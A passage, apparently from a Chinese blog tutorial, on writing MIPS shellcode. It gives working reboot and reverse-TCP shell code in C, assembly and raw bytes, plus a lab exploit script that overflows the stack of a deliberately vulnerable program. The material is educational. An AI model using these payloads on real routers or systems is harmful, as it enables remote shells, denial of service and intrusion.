class="number">0x0a</span>, <span class="number">0x20</span>]</span><br><span class="line"></span><br><span class="line">        encoder(srcfile, user_bad_bytes)</span><br></pre></td></tr></table></figure><h3 id="通用Shellcode开发"><a href="#通用Shellcode开发" class="headerlink" title="通用Shellcode开发"></a>通用Shellcode开发</h3><h4 id="reboot-shellcode"><a href="#reboot-shellcode" class="headerlink" title="reboot shellcode"></a>reboot shellcode</h4><ul><li>重启路由器造成拒绝服务攻击</li></ul><p><strong>C 语言reboot</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/reboot.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">reboot(<span class="number">0xfee1dead</span>, <span class="number">0x28121969</span>, <span class="number">0x4321fedc</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>man 2 reboot</code>查看使用</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025173301400.png" alt="image-20211025173301400"></p><p><strong>汇编代码 · reboot</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global __start</span><br><span class="line">.set noreorder</span><br><span class="line"></span><br><span class="line">__start:</span><br><span class="line">lui     $v0, 0x4321</span><br><span class="line">ori     $a2, $v0, 0xFEDC</span><br><span class="line">lui     $v0, 0x2812</span><br><span class="line">ori     $a1, $v0, 0x1969</span><br><span class="line">lui     $v0, 0xFEE1</span><br><span class="line">ori     $a0, $v0, 0xDEAD</span><br><span class="line">li      $v0, 4088</span><br><span class="line">syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="reverse-tcp-Shellcode"><a href="#reverse-tcp-Shellcode" class="headerlink" title="reverse_tcp Shellcode"></a>reverse_tcp Shellcode</h4><ul><li>反弹shell<ul><li>攻击躲避在防火墙后面的服务器</li></ul></li></ul><blockquote><p>以下均为大端序</p></blockquote><p><strong>C语言实现反向连接远程端口</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> soc, rc;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    serv_addr.sin_addr.s_addr = <span class="number">0x7f000001</span>; <span class="comment">// ip 127.0.0.1</span></span><br><span class="line">    serv_addr.sin_port = <span class="number">0x7777</span>; <span class="comment">// port 30583</span></span><br><span class="line">    soc = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    rc = connect(soc, (struct sockaddr *)&amp;serv_addr, <span class="number">0x10</span>);</span><br><span class="line">    dup2(soc, <span class="number">0</span>);</span><br><span class="line">    dup2(soc, <span class="number">1</span>);</span><br><span class="line">    dup2(soc, <span class="number">2</span>);</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Python getIP.py(BigEndian)</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">get_hex = <span class="keyword">lambda</span> x: <span class="built_in">hex</span>(x)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">ip = sys.argv[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>) <span class="comment"># big endian</span></span><br><span class="line"><span class="comment"># ip = sys.argv[1].split(&#x27;.&#x27;)[::-1] # little endian</span></span><br><span class="line">_ip = <span class="string">&quot;0x&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ip:</span><br><span class="line">    _ip += get_hex(<span class="built_in">int</span>(i))</span><br><span class="line"><span class="built_in">print</span>(_ip)</span><br></pre></td></tr></table></figure><h5 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h5><p><strong>Socket 系统调用 · socket(2, 2, 0)</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sys_socket</span><br><span class="line"># a0: domain</span><br><span class="line"># a1: type</span><br><span class="line"># a2: protocol</span><br><span class="line"></span><br><span class="line">li $t7,-6</span><br><span class="line">nor $t7,$t7,$zero</span><br><span class="line">addi $a0,$t7,-3</span><br><span class="line">addi $a1,$t7,-3</span><br><span class="line">slti $a2,$zero,-1</span><br><span class="line">li $v0,4183 # sys_socket</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><code>man 2 sokcet</code>查看使用</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025173324106.png" alt="image-20211025173324106"></p><h5 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sw $v0,-1($sp)</span><br><span class="line">lw $a0,-1($sp)</span><br><span class="line">li $t7,0xfffd</span><br><span class="line">nor $t7,$t7,$zero</span><br><span class="line">sw $t7,-32($sp)</span><br><span class="line">lui $t6,0x7777  #port</span><br><span class="line"># ori $t6,$t6,0x7777</span><br><span class="line">sw $t6,-28($sp)</span><br><span class="line">lui $t6,0x7f00  #ip(high)</span><br><span class="line">ori $t6,$t6,0x00001  #ip(low)</span><br><span class="line">sw $t6,-26($sp)</span><br><span class="line">addiu $a1,$sp,-30</span><br><span class="line">li $t4,-17</span><br><span class="line">nor $a2,$t4,$zero</span><br><span class="line">li $v0,4170  # sys_connect</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><code>man 2 connect</code>查看使用</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025173850171.png" alt="image-20211025173850171"></p><p><code>connect()</code>系统调用把由文件描述符<code>sockfd</code>所代表的套接字连接到<code>addr</code>所指定的地址上，参数 <code>addrlen</code>用于标明<code>addr</code>的大小。</p><p>因此我们需要构造一个<code>struct sockaddr</code>数据结构， 其定义如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> sa_family; <span class="comment">/* address family, AF_xxx */</span></span><br><span class="line"><span class="keyword">char</span> sa_data[<span class="number">14</span>]; <span class="comment">/* 14 bytes of protocol address */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>sa_family ：是2字节的地址家族，一般都是“AF_xxx”的形式，它的值包括三种：AF_INET，AF_INET6和AF_UNSPEC。<ul><li>如果指定 AF_INET，那么函数就不能返回任何IPV6相关的地址信息；</li><li>如果仅指定了AF_INET6，则就不能返回任何IPV4地址信息;</li><li>AF_UNSPEC 则意味着函数返回的是适用于指定主机名和服务名且适合任何协议族的地址如果某个主机既有 AAAA 记录(IPV6)地址，同时又有 A 记录(IPV4)地址，那么AAAA 记录将作为 sockaddr_in6 结构返回，而 A 记录则作为 sockaddr_in 结构返回</li><li>通常用的都是AF_INET</li></ul></li></ul><p>汇编代码分析：</p><ul><li>第5行：将Socket返回套接字文件描述符<code>$v0</code>保存到<code>$sp-1</code>中，在第6行将文件描述符赋给connect的第1个参数<code>$a0</code></li><li>第6~9行：构造 <code>serv_addr.sin_family</code> 参数, 这里先将4字节的<code>0x00000002</code>写入<code>$sp-32</code>, 但因为<code>sin_family</code>是2字节，所以最终的结构体首地址从<code>$sp-30</code></li><li>第10~12行：向<code>$sp-28</code>写入<code>0x7777</code> 【这里参考书中的代码，但在实际测试中第11行直接去掉也是可以实现效果的，所以去掉也可以】</li><li>第13~15行：从<code>$sp-26</code>开始写入<code>ip</code>地址(0x7f000001 127.0.0.1)， 此时，<code>struct sockaddr</code>结构体已构造完毕，其后8字节为填充字节</li><li>第16行：connect的第2个参数(struct sockaddr)结构体的首地址是从<code>$sp-30</code>开始的</li><li>第17~18行：将第2个参数占用的字节数16写入connect的第3个参数<code>$a2</code></li></ul><p><strong>dup2 系统调用</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sys_dup2</span><br><span class="line"># a0: oldfd (socket)</span><br><span class="line"># a1: newfd (0, 1, 2)</span><br><span class="line"></span><br><span class="line">li $s1,-3</span><br><span class="line">nor $s1,$s1,$zero</span><br><span class="line">lw $a0,-1($sp)</span><br><span class="line">dup2_loop:move $a1,$s1 # dup2_loop</span><br><span class="line">li $v0,4063 # sys_dup2</span><br><span class="line">syscall</span><br><span class="line">li $s0,-1</span><br><span class="line">addi $s1,$s1,-1</span><br><span class="line">bne $s1,$s0,dup2_loop</span><br></pre></td></tr></table></figure><p>dup2系统调用需要执行3次，因此可以使用一个循环来节省空间，相当于以下代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$s1 = <span class="number">2</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">dup2(socket_handle, $s1);</span><br><span class="line">$s0 = <span class="number">-1</span>;</span><br><span class="line">$s0 = $s0 - <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span>($s1 != $s0);</span><br></pre></td></tr></table></figure><p><strong>execve 系统调用 · execve(“//bin/sh”, 0, 0)</strong> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sys_execve</span><br><span class="line"># a0: filename (stored on the stack) &quot;//bin/sh&quot;</span><br><span class="line"># a1: argv &quot;//bin/sh&quot;</span><br><span class="line"># a2: envp (null)</span><br><span class="line"></span><br><span class="line">slti $a2,$zero,-1</span><br><span class="line">lui $t7,0x2f2f #&quot;//&quot;</span><br><span class="line">ori $t7,$t7,0x6269 #&quot;bi&quot;</span><br><span class="line">sw $t7,-20($sp)</span><br><span class="line">lui $t6,0x6e2f #&quot;n/&quot;</span><br><span class="line">ori $t6,$t6,0x7368 #&quot;sh&quot;</span><br><span class="line">sw $t6,-16($sp)</span><br><span class="line">sw $zero,-12($sp)</span><br><span class="line">addiu $a0,$sp,-20</span><br><span class="line">sw $a0,-8($sp)</span><br><span class="line">sw $zero,-4($sp)</span><br><span class="line">addiu $a1,$sp,-8</span><br><span class="line">li $v0,4011 # sys_execve</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><ul><li>使用<code>//bin/sh</code>是为了四字节对齐</li></ul><p>完整代码如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># MIPS Big Endian execve(1,&quot;ABC\n&quot;,5);</span><br><span class="line"># export: offset =&gt; 0x90</span><br><span class="line"># Size: 52 bytes</span><br><span class="line"># $ as execve.s -o s.o</span><br><span class="line"># $ ld s.o -o execve</span><br><span class="line"># $ ./execve</span><br><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line"></span><br><span class="line">__start:</span><br><span class="line"># sys_socket</span><br><span class="line"># a0: domain</span><br><span class="line"># a1: type</span><br><span class="line"># a2: protocol</span><br><span class="line"></span><br><span class="line">li $t7,-6</span><br><span class="line">nor $t7,$t7,$zero</span><br><span class="line">addi $a0,$t7,-3</span><br><span class="line">addi $a1,$t7,-3</span><br><span class="line">slti $a2,$zero,-1</span><br><span class="line">li $v0,4183 # sys_socket</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line"># sys_connect</span><br><span class="line"># a0: sockfd (stored on the stack)</span><br><span class="line"># a1: addr (data stored on the stack)</span><br><span class="line"># a2: addrlen</span><br><span class="line"></span><br><span class="line">sw $v0,-1($sp)</span><br><span class="line">lw $a0,-1($sp)</span><br><span class="line">li $t7,0xfffd</span><br><span class="line">nor $t7,$t7,$zero</span><br><span class="line">sw $t7,-32($sp)</span><br><span class="line">lui $t6,0x7777  #port</span><br><span class="line"># ori $t6,$t6,0x7777</span><br><span class="line">sw $t6,-28($sp)</span><br><span class="line">lui $t6,0x7f00  #ip(high)</span><br><span class="line">ori $t6,$t6,0x00001  #ip(low)</span><br><span class="line">sw $t6,-26($sp)</span><br><span class="line">addiu $a1,$sp,-30</span><br><span class="line">li $t4,-17</span><br><span class="line">nor $a2,$t4,$zero</span><br><span class="line">li $v0,4170  # sys_connect</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line"># sys_dup2</span><br><span class="line"># a0: oldfd (socket)</span><br><span class="line"># a1: newfd (0, 1, 2)</span><br><span class="line"></span><br><span class="line">li $s1,-3</span><br><span class="line">nor $s1,$s1,$zero</span><br><span class="line">lw $a0,-1($sp)</span><br><span class="line">dup2_loop:move $a1,$s1 # dup2_loop</span><br><span class="line">li $v0,4063 # sys_dup2</span><br><span class="line">syscall</span><br><span class="line">li $s0,-1</span><br><span class="line">addi $s1,$s1,-1</span><br><span class="line">bne $s1,$s0,dup2_loop</span><br><span class="line"></span><br><span class="line"># sys_execve</span><br><span class="line"># a0: filename (stored on the stack) &quot;//bin/sh&quot;</span><br><span class="line"># a1: argv &quot;//bin/sh&quot;</span><br><span class="line"># a2: envp (null)</span><br><span class="line"></span><br><span class="line">slti $a2,$zero,-1</span><br><span class="line">lui $t7,0x2f2f #&quot;//&quot;</span><br><span class="line">ori $t7,$t7,0x6269 #&quot;bi&quot;</span><br><span class="line">sw $t7,-20($sp)</span><br><span class="line">lui $t6,0x6e2f #&quot;n/&quot;</span><br><span class="line">ori $t6,$t6,0x7368 #&quot;sh&quot;</span><br><span class="line">sw $t6,-16($sp)</span><br><span class="line">sw $zero,-12($sp)</span><br><span class="line">addiu $a0,$sp,-20</span><br><span class="line">sw $a0,-8($sp)</span><br><span class="line">sw $zero,-4($sp)</span><br><span class="line">addiu $a1,$sp,-8</span><br><span class="line">li $v0,4011 # sys_execve</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>编译测试代码: </p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025203832259.png" alt="image-20211025203832259"></p><h3 id="Shellcode应用实例"><a href="#Shellcode应用实例" class="headerlink" title="Shellcode应用实例"></a>Shellcode应用实例</h3><p><strong>vuln_system.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system</span><span class="params">(<span class="keyword">int</span> code,<span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line">system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">&quot;passwd&quot;</span>,&amp;fileData))</span><br><span class="line">fileLen = fileData.st_size;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((fp = fopen(<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;rb&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Cannot open file passwd!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ch=fgetc(fp);</span><br><span class="line"><span class="keyword">while</span>(count &lt;= fileLen)</span><br><span class="line">&#123;</span><br><span class="line">buf[count++] = ch;</span><br><span class="line">ch = fgetc(fp);</span><br><span class="line">&#125;</span><br><span class="line">buf[--count] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf,<span class="string">&quot;adminpwd&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">do_system(count,<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;you have an invalid password!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mips-linux-gnu-gcc vuln_system.c -fno-stack-protector -z norelro -o vuln_system</span><br></pre></td></tr></table></figure><p><strong>checksec vuln_system</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  vuln_system checksec vuln_system</span><br><span class="line">    Arch:     mips-32-big</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>由于没有开启<code>NX</code>保护，因此我们可以在栈中部署代码并跳转到栈上执行shellcode</p><p>计算得溢出大小为<code>4 - -0x190 =&gt; 0x194</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025220900076.png" alt="image-20211025220900076"></p><p>根据前面对<code>vuln_system</code>的分析，</p><p>调试可知</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025221746390.png" alt="image-20211025221746390"></p><p>故我们可以在<code>0x7fffed60</code>处布置代码, 需要注意的是，堆栈是变化的，所以我们在测试时可能需要重新定位这个地址</p><p>综上， 编写如下EXP脚本</p><h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeshellcode</span>(<span class="params">hostip, port</span>):</span></span><br><span class="line">    host = socket.ntohl(struct.unpack(<span class="string">&#x27;I&#x27;</span>, socket.inet_aton(hostip))[<span class="number">0</span>])</span><br><span class="line">    hosts = struct.unpack(<span class="string">&#x27;cccc&#x27;</span>, struct.pack(<span class="string">&#x27;&gt;L&#x27;</span>, host))</span><br><span class="line">    ports = struct.unpack(<span class="string">&#x27;cccc&#x27;</span>, struct.pack(<span class="string">&#x27;&gt;L&#x27;</span>, port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sys_socket</span></span><br><span class="line">    <span class="comment"># a0: domain</span></span><br><span class="line">    <span class="comment"># a1: type</span></span><br><span class="line">    <span class="comment"># a2: protocol</span></span><br><span class="line">    mipshell = <span class="string">b&quot;\x24\x0f\xff\xfa&quot;</span>  <span class="comment"># li t7,-6</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\xe0\x78\x27&quot;</span>  <span class="comment"># nor t7,t7,zero</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x21\xe4\xff\xfd&quot;</span>  <span class="comment"># addi a0,t7,-3</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x21\xe5\xff\xfd&quot;</span>  <span class="comment"># addi a1,t7,-3</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x28\x06\xff\xff&quot;</span>  <span class="comment"># slti a2,zero,-1</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x02\x10\x57&quot;</span>  <span class="comment"># li v0,4183 # sys_socket</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\x01\x01\x0c&quot;</span>  <span class="comment"># syscall 0x40404</span></span><br><span class="line">    <span class="comment"># sys_connect</span></span><br><span class="line">    <span class="comment"># a0: sockfd (stored on the stack)</span></span><br><span class="line">    <span class="comment"># a1: addr (data stored on the stack)</span></span><br><span class="line">    <span class="comment"># a2: addrlen</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xa2\xff\xff&quot;</span>   <span class="comment"># sw v0,-1(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x8f\xa4\xff\xff&quot;</span>   <span class="comment"># lw a0,-1(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x34\x0f\xff\xfd&quot;</span>   <span class="comment"># li t7,0xfffd</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\xe0\x78\x27&quot;</span>   <span class="comment"># nor t7,t7,zero</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xaf\xff\xe0&quot;</span>   <span class="comment"># sw t7,-32(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x3c\x0e&quot;</span> + \</span><br><span class="line">        struct.pack(<span class="string">&#x27;2c&#x27;</span>, ports[<span class="number">2</span>], ports[<span class="number">3</span>])   <span class="comment"># lui t6,0x1f90</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x35\xce&quot;</span> + \</span><br><span class="line">        struct.pack(<span class="string">&#x27;2c&#x27;</span>, ports[<span class="number">2</span>], ports[<span class="number">3</span>])   <span class="comment"># ori t6,t6,0x1f90</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xae\xff\xe4&quot;</span>   <span class="comment"># sw t6,-28(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x3c\x0e&quot;</span> + \</span><br><span class="line">        struct.pack(<span class="string">&#x27;2c&#x27;</span>, hosts[<span class="number">0</span>], hosts[<span class="number">1</span>])   <span class="comment"># lui t6,0x7f01</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x35\xce&quot;</span> + \</span><br><span class="line">        struct.pack(<span class="string">&#x27;2c&#x27;</span>, hosts[<span class="number">2</span>], hosts[<span class="number">3</span>])   <span class="comment"># ori t6,t6,0x101</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xae\xff\xe6&quot;</span>   <span class="comment"># sw t6,-26(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x27\xa5\xff\xe2&quot;</span>   <span class="comment"># addiu a1,sp,-30</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x0c\xff\xef&quot;</span>   <span class="comment"># li t4,-17</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\x80\x30\x27&quot;</span>   <span class="comment"># nor a2,t4,zero</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x02\x10\x4a&quot;</span>   <span class="comment"># li v0,4170  # sys_connect</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\x01\x01\x0c&quot;</span>   <span class="comment"># syscall 0x40404</span></span><br><span class="line">    <span class="comment"># sys_dup2</span></span><br><span class="line">    <span class="comment"># a0: oldfd (socket)</span></span><br><span class="line">    <span class="comment"># a1: newfd (0, 1, 2)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x11\xff\xfd&quot;</span>   <span class="comment"># li s1,-3</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x02\x20\x88\x27&quot;</span>   <span class="comment"># nor s1,s1,zero</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x8f\xa4\xff\xff&quot;</span>   <span class="comment"># lw a0,-1(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x02\x20\x28\x21&quot;</span>   <span class="comment"># move a1,s1 # dup2_loop</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x02\x0f\xdf&quot;</span>   <span class="comment"># li v0,4063 # sys_dup2</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\x01\x01\x0c&quot;</span>   <span class="comment"># syscall 0x40404</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x10\xff\xff&quot;</span>   <span class="comment"># li s0,-1</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x22\x31\xff\xff&quot;</span>   <span class="comment"># addi s1,s1,-1</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x16\x30\xff\xfa&quot;</span>   <span class="comment"># bne s1,s0,68 &lt;dup2_loop&gt;</span></span><br><span class="line">    <span class="comment"># sys_execve</span></span><br><span class="line">    <span class="comment"># a0: filename (stored on the stack) &quot;//bin/sh&quot;</span></span><br><span class="line">    <span class="comment"># a1: argv &quot;//bin/sh&quot;</span></span><br><span class="line">    <span class="comment"># a2: envp (null)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x28\x06\xff\xff&quot;</span>   <span class="comment"># slti a2,zero,-1</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x3c\x0f\x2f\x2f&quot;</span>   <span class="comment"># lui t7,0x2f2f &quot;//&quot;</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x35\xef\x62\x69&quot;</span>   <span class="comment"># ori t7,t7,0x6269 &quot;bi&quot;</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xaf\xff\xec&quot;</span>   <span class="comment"># sw t7,-20(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x3c\x0e\x6e\x2f&quot;</span>   <span class="comment"># lui t6,0x6e2f &quot;n/&quot;</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x35\xce\x73\x68&quot;</span>   <span class="comment"># ori t6,t6,0x7368 &quot;sh&quot;</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xae\xff\xf0&quot;</span>   <span class="comment"># sw t6,-16(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xa0\xff\xf4&quot;</span>   <span class="comment"># sw zero,-12(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x27\xa4\xff\xec&quot;</span>   <span class="comment"># addiu a0,sp,-20</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xa4\xff\xf8&quot;</span>   <span class="comment"># sw a0,-8(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\xaf\xa0\xff\xfc&quot;</span>   <span class="comment"># sw zero,-4(sp)</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x27\xa5\xff\xf8&quot;</span>   <span class="comment"># addiu a1,sp,-8</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x24\x02\x0f\xab&quot;</span>   <span class="comment"># li v0,4011 # sys_execve</span></span><br><span class="line">    mipshell += <span class="string">b&quot;\x01\x01\x01\x0c&quot;</span>  <span class="comment"># syscall 0x40404</span></span><br><span class="line">    <span class="keyword">return</span> mipshell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] prepare shellcode&#x27;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">b&quot;sh&quot;</span>.ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload</span></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x194</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&gt;L&quot;</span>, <span class="number">0x7fffed60</span>)     </span><br><span class="line">    payload += makeshellcode(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">4444</span>)            </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27; ok!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create password file</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] create password file&#x27;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    fw = <span class="built_in">open</span>(<span class="string">&#x27;passwd&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    fw.write(payload) </span><br><span class="line">    fw.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27; ok!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] payload length = <span class="subst">&#123;<span class="built_in">hex</span>(<span 